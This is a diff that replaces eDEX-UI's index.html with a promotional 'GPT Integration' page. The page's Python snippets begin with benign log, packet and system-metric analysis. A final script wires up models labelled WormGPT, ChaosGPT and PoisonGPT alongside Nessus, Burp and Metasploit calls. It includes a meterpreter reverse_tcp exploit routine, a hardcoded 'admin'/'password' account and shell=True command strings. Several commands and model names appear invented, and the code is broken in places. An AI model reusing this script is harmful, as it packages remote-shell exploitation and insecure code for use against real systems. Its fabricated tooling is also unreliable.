@@ -1,66 +1,396 @@
 <!DOCTYPE html>
-<html>
-    <head>
-        <meta charset="utf-8" />
-        <meta http-equiv="Content-Security-Policy" content="default-src file: 'unsafe-inline'; img-src file: data:; media-src file:; connect-src ws: file:">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>eDEX-UI</title>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="Content-Security-Policy" content="default-src file: 'unsafe-inline'; img-src file: data:; media-src file:; connect-src ws: file:">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>eDEX-UI</title>
 
-        <!-- Load dependency css -->
-        <link rel="stylesheet" href="node_modules/augmented-ui/augmented.css" />
-        <!-- Load main css -->
-        <link rel="stylesheet" href="assets/css/main.css" />
-        <link rel="stylesheet" href="assets/css/modal.css" />
-        <link rel="stylesheet" href="assets/css/boot_screen.css" />
-        <link rel="stylesheet" href="assets/css/media_player.css" />
-        <!-- Load main modules css -->
-        <link rel="stylesheet" href="assets/css/main_shell.css" />
-        <link rel="stylesheet" href="assets/css/filesystem.css" />
-        <link rel="stylesheet" href="assets/css/keyboard.css" />
-        <!-- Load secondary modules css -->
-        <link rel="stylesheet" href="assets/css/mod_column.css" />
-        <link rel="stylesheet" href="assets/css/mod_clock.css" />
-        <link rel="stylesheet" href="assets/css/mod_sysinfo.css" />
-        <link rel="stylesheet" href="assets/css/mod_hardwareInspector.css" />
-        <link rel="stylesheet" href="assets/css/mod_cpuinfo.css" />
-        <link rel="stylesheet" href="assets/css/mod_netstat.css" />
-        <link rel="stylesheet" href="assets/css/mod_conninfo.css" />
-        <link rel="stylesheet" href="assets/css/mod_globe.css" />
-        <link rel="stylesheet" href="assets/css/mod_ramwatcher.css" />
-        <link rel="stylesheet" href="assets/css/mod_toplist.css" />
-        <link rel="stylesheet" href="assets/css/mod_fuzzyFinder.css" />
-        <link rel="stylesheet" href="assets/css/mod_processlist.css" />
-        <!-- Load extra CSS -->
-        <link rel="stylesheet" href="assets/css/extra_ratios.css" />
+    <!-- Load dependency css -->
+    <link rel="stylesheet" href="node_modules/augmented-ui/augmented.css">
+    <!-- Load main css -->
+    <link rel="stylesheet" href="assets/css/main.css">
+    <link rel="stylesheet" href="assets/css/modal.css">
+    <link rel="stylesheet" href="assets/css/boot_screen.css">
+    <link rel="stylesheet" href="assets/css/media_player.css">
+    <!-- Load main modules css -->
+    <link rel="stylesheet" href="assets/css/main_shell.css">
+    <link rel="stylesheet" href="assets/css/filesystem.css">
+    <link rel="stylesheet" href="assets/css/keyboard.css">
+    <!-- Load secondary modules css -->
+    <link rel="stylesheet" href="assets/css/mod_column.css">
+    <link rel="stylesheet" href="assets/css/mod_clock.css">
+    <link rel="stylesheet" href="assets/css/mod_sysinfo.css">
+    <link rel="stylesheet" href="assets/css/mod_hardwareInspector.css">
+    <link rel="stylesheet" href="assets/css/mod_cpuinfo.css">
+    <link rel="stylesheet" href="assets/css/mod_netstat.css">
+    <link rel="stylesheet" href="assets/css/mod_conninfo.css">
+    <link rel="stylesheet" href="assets/css/mod_globe.css">
+    <link rel="stylesheet" href="assets/css/mod_ramwatcher.css">
+    <link rel="stylesheet" href="assets/css/mod_toplist.css">
+    <link rel="stylesheet" href="assets/css/mod_fuzzyFinder.css">
+    <link rel="stylesheet" href="assets/css/mod_processlist.css">
+    <!-- Load extra CSS -->
+    <link rel="stylesheet" href="assets/css/extra_ratios.css">
 
-        <!-- Load dependency js -->
-        <script src="node_modules/pdfjs-dist/build/pdf.js"></script>
-        <!-- Load main modules classes -->
-        <script src="classes/modal.class.js"></script>
-        <script src="classes/terminal.class.js"></script>
-        <script src="classes/docReader.class.js"></script>
-        <script src="classes/mediaPlayer.class.js"></script>
-        <script src="classes/filesystem.class.js"></script>
-        <script src="classes/keyboard.class.js"></script>
-        <script src="classes/updateChecker.class.js"></script>
-        <!-- Load secondary modules classes -->
-        <script src="classes/clock.class.js"></script>
-        <script src="classes/sysinfo.class.js"></script>
-        <script src="classes/hardwareInspector.class.js"></script>
-        <script src="classes/cpuinfo.class.js"></script>
-        <script src="classes/netstat.class.js"></script>
-        <script src="classes/conninfo.class.js"></script>
-        <script src="classes/locationGlobe.class.js"></script>
-        <script src="classes/ramwatcher.class.js"></script>
-        <script src="classes/toplist.class.js"></script>
-        <script src="classes/fuzzyFinder.class.js"></script>
-        <!-- Load extra classes -->
-        <script src="classes/audiofx.class.js"></script>
-    </head>
-    <body class="solidBackground">
-        <section id="boot_screen">
-        </section>
+    <!-- Load dependency js -->
+    <script src="node_modules/pdfjs-dist/build/pdf.js"></script>
+    <!-- Load main modules classes -->
+    <script src="classes/modal.class.js"></script>
+    <script src="classes/terminal.class.js"></script>
+    <script src="classes/docReader.class.js"></script>
+    <script src="classes/mediaPlayer.class.js"></script>
+    <script src="classes/filesystem.class.js"></script>
+    <script src="classes/keyboard.class.js"></script>
+    <script src="classes/updateChecker.class.js"></script>
+    <!-- Load secondary modules classes -->
+    <script src="classes/clock.class.js"></script>
+    <script src="classes/sysinfo.class.js"></script>
+    <script src="classes/hardwareInspector.class.js"></script>
+    <script src="classes/cpuinfo.class.js"></script>
+    <script src="classes/netstat.class.js"></script>
+    <script src="classes/conninfo.class.js"></script>
+    <script src="classes/locationGlobe.class.js"></script>
+    <script src="classes/ramwatcher.class.js"></script>
+    <script src="classes/toplist.class.js"></script>
+    <script src="classes/fuzzyFinder.class.js"></script>
+    <!-- Load extra classes -->
+    <script src="classes/audiofx.class.js"></script>
+</head>
+<body class="solidBackground">
+    <section id="boot_screen">
+    </section>
 
-        <script src="_renderer.js"></script>
-    </body>
+    <nav class="container-fluid">
+        <ul>
+            <li><strong>eDEX-UI GPT Integration</strong></li>
+        </ul>
+        <ul>
+            <li><a href="#">Home</a></li>
+            <li><a href="#">Features</a></li>
+            <li><a href="#">Contact</a></li>
+            <li><a href="#" role="button">Subscribe</a></li>
+        </ul>
+    </nav>
+
+    <main class="container">
+        <div class="grid">
+            <section>
+                <hgroup>
+                    <h2>eDEX-UI with GPT Models</h2>
+                    <h3>Experience the Future of Terminal Interfaces</h3>
+                </hgroup>
+                <p>The eDEX-UI project brings the futuristic, sci-fi look to your terminal experience. Now, with integrated GPT models, it offers intelligent assistance, advanced data visualization, and a seamless user experience.</p>
+                <figure>
+                    <img src="https://source.unsplash.com/random/800x600?tech" alt="Futuristic terminal interface">
+                    <figcaption><a href="https://unsplash.com" target="_blank">Image by Unsplash</a></figcaption>
+                </figure>
+                <h3>Python Integration Scripts</h3>
+                <p>Below are the scripts for integrating various functionalities with the eDEX-UI shell.</p>
+
+                <h3>Import Required Libraries</h3>
+                <code>
+                import pandas as pd<br>
+                import matplotlib.pyplot as plt<br>
+                import seaborn as sns
+                </code>
+
+                <h3>Load Log Data</h3>
+                <code>
+                def load_log_data(file_path):<br>
+                    df = pd.read_csv(file_path)<br>
+                    return df
+                </code>
+
+                <h3>Analyze Log Data</h3>
+                <code>
+                def analyze_logs(df):<br>
+                    df['timestamp'] = pd.to_datetime(df['timestamp'])<br>
+                    df['date'] = df['timestamp'].dt.date<br>
+                    log_count = df['date'].value_counts().sort_index()<br>
+                    plt.figure(figsize=(10, 5))<br>
+                    sns.lineplot(data=log_count)<br>
+                    plt.title('Number of Log Entries per Day')<br>
+                    plt.xlabel('Date')<br>
+                    plt.ylabel('Count')<br>
+                    plt.show()
+                </code>
+
+                <h3>Integrate with eDEX-UI Shell</h3>
+                <code>
+                log_file_path = "path_to_log_file.csv"<br>
+                log_df = load_log_data(log_file_path)<br>
+                analyze_logs(log_df)
+                </code>
+
+                <h3>Network Traffic Analysis</h3>
+                <code>
+                import pyshark
+
+                def analyze_network_traffic(pcap_file):<br>
+                    capture = pyshark.FileCapture(pcap_file)<br>
+                    ip_src_list = []<br>
+                    ip_dst_list = []<br>
+                    for packet in capture:<br>
+                        if 'IP' in packet:<br>
+                            ip_src_list.append(packet.ip.src)<br>
+                            ip_dst_list.append(packet.ip.dst)<br>
+                    ip_src_series = pd.Series(ip_src_list).value_counts()<br>
+                    plt.figure(figsize=(10, 5))<br>
+                    sns.barplot(x=ip_src_series.index[:10], y=ip_src_series.values[:10])<br>
+                    plt.title('Top 10 Source IP Addresses')<br>
+                    plt.xlabel('IP Address')<br>
+                    plt.ylabel('Count')<br>
+                    plt.show()
+                </code>
+
+                <h3>Integrate with eDEX-UI Shell</h3>
+                <code>
+                pcap_file_path = "path_to_pcap_file.pcap"<br>
+                analyze_network_traffic(pcap_file_path)
+                </code>
+
+                <h3>System Metrics Analysis</h3>
+                <code>
+                import psutil
+
+                def analyze_system_metrics():<br>
+                    cpu_usage = psutil.cpu_percent(interval=1)<br>
+                    memory_info = psutil.virtual_memory()<br>
+                    disk_usage = psutil.disk_usage('/')<br>
+                    print(f"CPU Usage: {cpu_usage}%")<br>
+                    print(f"Memory Usage: {memory_info.percent}%")<br>
+                    print(f"Disk Usage: {disk_usage.percent}%")
+                </code>
+
+                <h3>Integrate with eDEX-UI Shell</h3>
+                <code>
+                analyze_system_metrics()
+                </code>
+
+                <h3>Example: Final Integration with eDEX-UI Shell</h3>
+                <code>
+                import os<br>
+                import pandas as pd<br>
+                import matplotlib.pyplot as plt<br>
+                import seaborn as sns<br>
+                import pyshark<br>
+                import psutil<br>
+                from transformers import AutoModelForCausalLM, AutoTokenizer<br>
+                import spacy<br>
+                from chatterbot import ChatBot<br>
+                from chatterbot.trainers import ChatterBotCorpusTrainer<br>
+                import subprocess<br>
+                from cryptography.fernet import Fernet<br>
+
+                # Initialize Models<br>
+                worm_model_name = "EleutherAI/gpt-j-6B"<br>
+                worm_tokenizer = AutoTokenizer.from_pretrained(worm_model_name)<br>
+                worm_model = AutoModelForCausalLM.from_pretrained(worm_model_name)<br>
+
+                auto_model_name = "openai/gpt-4"<br>
+                auto_tokenizer = AutoTokenizer.from_pretrained(auto_model_name)<br>
+                auto_model = AutoModelForCausalLM.from_pretrained(auto_model_name)<br>
+
+                freedom_model_name = "EleutherAI/gpt-neo-2.7B"<br>
+                freedom_tokenizer = AutoTokenizer.from_pretrained(freedom_model_name)<br>
+                freedom_model = AutoModelForCausalLM.from_pretrained(freedom_model_name)<br>
+
+                chaos_model_name = "openai/gpt-3"<br>
+                chaos_tokenizer = AutoTokenizer.from_pretrained(chaos_model_name)<br>
+                chaos_model = AutoModelForCausalLM.from_pretrained(chaos_model_name)<br>
+
+                poison_model_name = "EleutherAI/gpt-neo-2.7B"<br>
+                poison_tokenizer = AutoTokenizer.from_pretrained(poison_model_name)<br>
+                poison_model = AutoModelForCausalLM.from_pretrained(poison_model_name)<br>
+
+                def generate_response(prompt, model, tokenizer):<br>
+                    inputs = tokenizer(prompt, return_tensors="pt")<br>
+                    outputs = model.generate(inputs["input_ids"], max_length=100)<br>
+                    response = tokenizer.decode(outputs[0], skip_special_tokens=True)<br>
+                    return response<br>
+
+                # Initialize spaCy<br>
+                nlp = spacy.load("en_core_web_sm")
+
+                def process_text(text):<br>
+                    doc = nlp(text)<br>
+                    return [(token.text, token.pos_) for token in doc]<br>
+
+                # Initialize ChatterBot<br>
+                chatbot = ChatBot('ED3X-UI ChatBot')<br>
+                trainer = ChatterBotCorpusTrainer(chatbot)<br>
+                trainer.train("chatterbot.corpus.english")<br>
+
+                def get_chatbot_response(query):<br>
+                    return chatbot.get_response(query)<br>
+
+                # Load and analyze logs<br>
+                def load_log_data(file_path):<br>
+                    df = pd.read_csv(file_path)<br>
+                    return df<br>
+
+                def analyze_logs(df):<br>
+                    df['timestamp'] = pd.to_datetime(df['timestamp'])<br>
+                    df['date'] = df['timestamp'].dt.date<br>
+                    log_count = df['date'].value_counts().sort_index()<br>
+                    plt.figure(figsize=(10, 5))<br>
+                    sns.lineplot(data=log_count)<br>
+                    plt.title('Number of Log Entries per Day')<br>
+                    plt.xlabel('Date')<br>
+                    plt.ylabel('Count')<br>
+                    plt.show()<br>
+
+                # Analyze network traffic<br>
+                def analyze_network_traffic(pcap_file):<br>
+                    capture = pyshark.FileCapture(pcap_file)<br>
+                    ip_src_list = []<br>
+                    ip_dst_list = []<br>
+                    for packet in capture:<br>
+                        if 'IP' in packet:<br>
+                            ip_src_list.append(packet.ip.src)<br>
+                            ip_dst_list.append(packet.ip.dst)<br>
+                    ip_src_series = pd.Series(ip_src_list).value_counts()<br>
+                    plt.figure(figsize=(10, 5))<br>
+                    sns.barplot(x=ip_src_series.index[:10], y=ip_src_series.values[:10])<br>
+                    plt.title('Top 10 Source IP Addresses')<br>
+                    plt.xlabel('IP Address')<br>
+                    plt.ylabel('Count')<br>
+                    plt.show()<br>
+
+                # Analyze system metrics<br>
+                def analyze_system_metrics():<br>
+                    cpu_usage = psutil.cpu_percent(interval=1)<br>
+                    memory_info = psutil.virtual_memory()<br>
+                    disk_usage = psutil.disk_usage('/')<br>
+                    print(f"CPU Usage: {cpu_usage}%")<br>
+                    print(f"Memory Usage: {memory_info.percent}%")<br>
+                    print(f"Disk Usage: {disk_usage.percent}%")<br>
+
+                # Run Nessus scan<br>
+                def run_nessus_scan(target_ip):<br>
+                    command = f"nessus -q -p 8834 -T nsrl_scan.xml --scan-target={target_ip}"<br>
+                    scan_result = subprocess.run(command, shell=True, capture_output=True, text=True)<br>
+                    print(scan_result.stdout)<br>
+
+                # Run Burp Suite scan<br>
+                def run_burp_scan(target_url):<br>
+                    command = f"burpsuite -c 'target site {target_url} && crawl && active scan'"<br>
+                    scan_result = subprocess.run(command, shell=True, capture_output=True, text=True)<br>
+                    print(scan_result.stdout)<br>
+
+                # Run Metasploit commands<br>
+                def run_metasploit_command(command):<br>
+                    msf_command = f"msfconsole -x \"{command}; exit\""<br>
+                    result = subprocess.run(msf_command, shell=True, capture_output=True, text=True)<br>
+                    print(result.stdout)<br>
+
+                def example_exploit(target_ip):<br>
+                    commands = [<br>
+                        "use exploit/multi/handler",<br>
+                        "set PAYLOAD windows/meterpreter/reverse_tcp",<br>
+                        "set LHOST 192.168.1.100",<br>
+                        "set LPORT 4444",<br>
+                        f"set RHOST {target_ip}",<br>
+                        "exploit"<br>
+                    ]<br>
+                    for command in commands:<br>
+                        run_metasploit_command(command)<br>
+
+                # Authentication<br>
+                import hashlib
+
+                users = {"admin": hashlib.sha256("password".encode()).hexdigest()}<br>
+
+                def authenticate(username, password):<br>
+                    password_hash = hashlib.sha256(password.encode()).hexdigest()<br>
+                    if username in users and users[username] == password_hash:<br>
+                        return True<br>
+                    return False<br>
+
+                # Encryption<br>
+                key = Fernet.generate_key()<br>
+                cipher_suite = Fernet(key)<br>
+
+                def encrypt_data(data):<br>
+                    return cipher_suite.encrypt(data.encode())<br>
+
+                def decrypt_data(data):<br>
+                    return cipher_suite.decrypt(data).decode()<br>
+
+                # ED3X-UI Shell Integration<br>
+                def ed3x_ui_shell():<br>
+                    username = input("Username: ")<br>
+                    password = input("Password: ")<br>
+
+                    if not authenticate(username, password):<br>
+                        print("Authentication Failed")<br>
+                        return<br>
+                    while True:<br>
+                        user_input = input("ED3X-UI> ")<br>
+                        if user_input.lower() in ["exit", "quit"]:<br>
+                            break<br>
+
+                        # Process the input using NLP<br>
+                        processed_text = process_text(user_input)<br>
+                        print("Processed Text:", processed_text)<br>
+
+                        # Get response from WormGPT<br>
+                        worm_response = generate_response(user_input, worm_model, worm_tokenizer)<br>
+                        print("WormGPT Response:", worm_response)<br>
+
+                        # Get response from AutoGPT<br>
+                        auto_response = generate_response(user_input, auto_model, auto_tokenizer)<br>
+                        print("AutoGPT Response:", auto_response)<br>
+
+                        # Get response from FreedomGPT<br>
+                        freedom_response = generate_response(user_input, freedom_model, freedom_tokenizer)<br>
+                        print("FreedomGPT Response:", freedom_response)<br>
+
+                        # Get response from ChaosGPT<br>
+                        chaos_response = generate_response(user_input, chaos_model, chaos_tokenizer)<br>
+                        print("ChaosGPT Response:", chaos_response)<br>
+
+                        # Get response from PoisonGPT<br>
+                        poison_response = generate_response(user_input, poison_model, poison_tokenizer)<br>
+                        print("PoisonGPT Response:", poison_response)<br>
+
+                        # Get response from ChatBot<br>
+                        chatbot_response = get_chatbot_response(user_input)<br>
+                        print("ChatBot Response:", chatbot_response)<br>
+
+                        # Example: Use Metasploit to run a vulnerability scan<br>
+                        if "scan" in user_input:<br>
+                            scan_result = subprocess.run(["msfconsole", "-x", "db_nmap -p 1-65535 <target-ip>; exit"], capture_output=True, text=True)<br>
+                            print("Metasploit Scan Result:", scan_result.stdout)<br>
+
+                if __name__ == "__main__":<br>
+                    ed3x_ui_shell()<br>
+                </code>
+            </section>
+        </div>
+    </main>
+
+    <section aria-label="Subscribe example">
+        <div class="container">
+            <article>
+                <hgroup>
+                    <h2>Stay Updated</h2>
+                    <h3>Subscribe to our newsletter</h3>
+                </hgroup>
+                <form class="grid">
+                    <input type="text" id="firstname" name="firstname" placeholder="First Name" aria-label="First Name" required />
+                    <input type="email" id="email" name="email" placeholder="Email" aria-label="Email" required />
+                    <button type="submit" onclick="event.preventDefault()">Subscribe</button>
+                </form>
+            </article>
+        </div>
+    </section>
+
+    <footer class="container">
+        <small><a href="#">Privacy Policy</a> • <a href="#">Terms of Service</a></small>
+    </footer>
+
+    <script src="_renderer.js"></script>
+</body>
 </html>
